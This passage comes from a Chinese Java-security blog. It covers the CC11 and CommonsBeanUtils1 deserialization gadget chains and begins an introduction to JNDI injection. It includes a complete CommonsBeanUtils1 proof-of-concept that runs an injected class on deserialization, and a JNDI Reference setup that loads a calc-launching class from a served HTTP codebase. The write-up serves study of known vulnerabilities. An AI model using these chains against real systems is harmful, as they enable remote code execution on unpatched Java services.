class="string">&quot;n4c1&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里我也不知道是怎么回事, 大概是TiedMapEntry触发了LazyMap的懒加载机制, 但是调试了很久也没有定位到</p><p>其他的细节问题在CC6中已经分析过了这里就不赘述了</p><p>那么CC11就算完成了</p><h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>jdk8无限制, 我这里依然使用jdk8u65</p><p>其他依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-beanutils<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-logging/commons-logging --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>关于JavaBean可以参考廖雪峰老师官方网站</p><p><a href="https://liaoxuefeng.com/books/java/oop/core/javabean/">https://liaoxuefeng.com/books/java/oop/core/javabean/</a></p><p>实际上JavaBean就是对一个Java类的标准封装方法, 我们只需要使用它的getter和setter方法来操作其中的property, 而不需要关系其具体实现过程</p><p>在Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法</p><p>例如我们有一个Person类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样就是一个JavaBean的写法</p><p>使用PropertyUtils.getProperty调用getter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(<span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;n4c1&quot;</span>, <span class="number">20</span>), <span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 输出结果: n4c1</span></span><br></pre></td></tr></table></figure><p>这会根据传入的参数自动找到对应的getter也就是getName方法</p><h3 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h3><p>所以我们为什么要说到getProperty这个方法呢?</p><p>回顾一下我们在使用恶意加载类时的TemplatesImpl这个类</p><p>进入这个类的第一跳是newTransformer方法, 如果再往前推一跳, 看谁调用了newTransformer方法,可以找到这里</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725144545883.png" alt="image-20240725144545883"></p><p>这个写法正是一个getter, 并且作用域为 public, 我们就可以使用PropertyUtils.getProperty来调用</p><p>那么这部分链子大概就是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145217573.png" alt="image-20240725145217573"></p><p>接下来就是从getProperty方法把链子向反序列化入口readObject延申</p><p>谁调用了getProperty?</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725145938804.png" alt="image-20240725145938804"></p><p>在BeanComparator这个类中的compare方法中有两处调用</p><p>这个compare在其他类中使用的非常多, 我们需要找到一个可序列化的类来延申链子</p><p>这里我们找到之前使用过的一个类 PriorityQueue</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150808043.png" alt="image-20240725150808043"></p><p>在siftDownUsingComparator方法中调用了compare</p><p>继续找siftDownUsingComparator的调用</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725150928391.png" alt="image-20240725150928391"></p><p>在同一个类中, siftDown对其进行了调用</p><p>继续</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151033240.png" alt="image-20240725151033240"></p><p>在同一个类中heapify调用了siftDown</p><p>再进一步我们就会发现</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725151145897.png" alt="image-20240725151145897"></p><p>同一个类的readObject调用了heapify</p><p>实际上熟悉的师傅们都知道这其实就是CC4的前半链</p><p>串联起来大概是这样</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725153027846.png" alt="image-20240725153027846"></p><p>接下来就是依照这个流程来手写exp了</p><p>首先我们确定从compare开始这条链子是通的</p><p>如图代码</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725160518504.png" alt="image-20240725160518504"></p><p>由于add是会触发compare比较的(有兴趣的师傅可以调式看看), 所以反射赋值</p><p>还有outputProperties这个值也需要反射赋值进去, 不然会抛出错误导致序列化失败</p><p>所以最终应该是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.PropertyUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsBeanUtils1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException, NoSuchMethodException, IOException, NoSuchFieldException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\tmp\\Evil.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;n4c1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">cls</span> <span class="operator">=</span> TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_class&quot;</span>);</span><br><span class="line">        cls.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        cls.set(templates, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">2</span>, beanComparator);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">queue</span> <span class="operator">=</span> PriorityQueue.class.getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">        queue.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] objects = &#123;templates, <span class="number">1</span>&#125;;</span><br><span class="line">        queue.set(priorityQueue, objects);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">property</span> <span class="operator">=</span> BeanComparator.class.getDeclaredField(<span class="string">&quot;property&quot;</span>);</span><br><span class="line">        property.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        property.set(beanComparator, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line"></span><br><span class="line">        unserialize(<span class="string">&quot;CB1.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CB1.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(name));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>注:</p><p>这里的PriorityQueue的queue属性虽然被transient修饰为不可序列化, 但是PriorityQueue自定义类writeObject方法来序列化queue中的内容</p></blockquote><p>我们只反序列化看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240725171752965.png" alt="image-20240725171752965"></p><p>成功执行</p><h2 id="总结-完整流程图"><a href="#总结-完整流程图" class="headerlink" title="总结(完整流程图)"></a>总结(完整流程图)</h2><p>这两条链子的整个流程:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/CC11%20%26%20CommonsBeanUtils1.png" alt="CC11 &amp; CommonsBeanUtils1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI注入初探</title>
      <link href="/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/"/>
      <url>/2024/07/12/JNDI%E6%B3%A8%E5%85%A5%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="JNDI注入初探"><a href="#JNDI注入初探" class="headerlink" title="JNDI注入初探"></a>JNDI注入初探</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tttang.com/archive/1611/">https://tttang.com/archive/1611/</a></p><p><a href="https://xz.aliyun.com/t/12277">https://xz.aliyun.com/t/12277</a></p><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/</a></p><h2 id="JNDI-的利用方式"><a href="#JNDI-的利用方式" class="headerlink" title="JNDI 的利用方式"></a>JNDI 的利用方式</h2><h3 id="JNDI结合RMI"><a href="#JNDI结合RMI" class="headerlink" title="JNDI结合RMI"></a>JNDI结合RMI</h3><p>首先上服务端和客户端代码</p><p>Server:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjImpl</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">RemoteObj</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteObjImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">sayHello</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hello, &quot;</span> + name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObjImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjImpl</span>();</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, remoteObjImpl);</span><br><span class="line">        System.out.println(<span class="string">&quot;运行中...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">JndiRmiServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="RMI原生的漏洞"><a href="#RMI原生的漏洞" class="headerlink" title="RMI原生的漏洞"></a>RMI原生的漏洞</h4><p>首先跟一下调试, 证明JNDI的rmi服务实际上还是调用了原生的RMI</p><p>我们在客户端的这里打断点, 一直跟lookup方法(详细见参考链接)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230751811.png" alt="image-20240712230751811"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240712230544299.png" alt="image-20240712230544299"></p><p>可以看见最后还是执行了我们熟悉的RegistryImpl_Stub类的lookup方法</p><p>因此rmi存在的漏洞这里也是适用的</p><h4 id="引用的漏洞，Normal-Jndi"><a href="#引用的漏洞，Normal-Jndi" class="headerlink" title="引用的漏洞，Normal Jndi"></a>引用的漏洞，Normal Jndi</h4><ul><li>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</li></ul><p>这个漏洞与服务端调用了一个 <code>Reference</code> 对象有关</p><p>它类似于一个代理, 从外部url加载一个类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;Calc&quot;</span>,<span class="string">&quot;http://localhost:7777/&quot;</span>);</span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);</span><br></pre></td></tr></table></figure><p>我们先来看对应Reference的构造函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713153750900.png" alt="image-20240713153750900"></p><p>后两个参数 factory, factoryLocation, 不禁让人联想到工厂模式这一设计理念, factoryLocation就是对象工厂的位置(我们的是http), factory为对象工厂名, 前面的className就是要实例化的类既然要实例化, 那它的构造函数就会被调用, 因此可以构造一个恶意类, 其构造函数中存放恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiCalc</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用javac将其编译为字节码(建议使用命令行来进行, 避免此字节码具有包结构, 注意使用和客户端服务端相同的java版本)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac JndiCalc.java</span><br></pre></td></tr></table></figure><p>然后使用python起一个http服务将其开放即可</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server 7777</span><br></pre></td></tr></table></figure><p>之后运行客户端代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiRmiClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">RemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (RemoteObj) initialContext.lookup(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>);</span><br><span class="line">        System.out.println(remoteObj.sayHello(<span class="string">&quot;n4c1&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713154736808.png" alt="image-20240713154736808"></p><p>可以跟一下调试</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240713160109911.png" alt="image-20240713160109911"></p><p>到这里实例化了恶意对象</p><p>此方法加载了外部的java字节码, 在高版本中这是不受信任的</p><h3 id="JNDI结合LDAP"><a href="#JNDI结合LDAP" class="headerlink" title="JNDI结合LDAP"></a>JNDI结合LDAP</h3><p>有关LDAP的概念和原理:</p><p><a href="https://www.cnblogs.com/wilburxu/p/9174353.html">https://www.cnblogs.com/wilburxu/p/9174353.html</a></p><blockquote><ul><li>ldap 是一种协议，并不是 Java 独有的。</li></ul><p>LDAP 既是一类服务，也是一种协议，定义在 <a 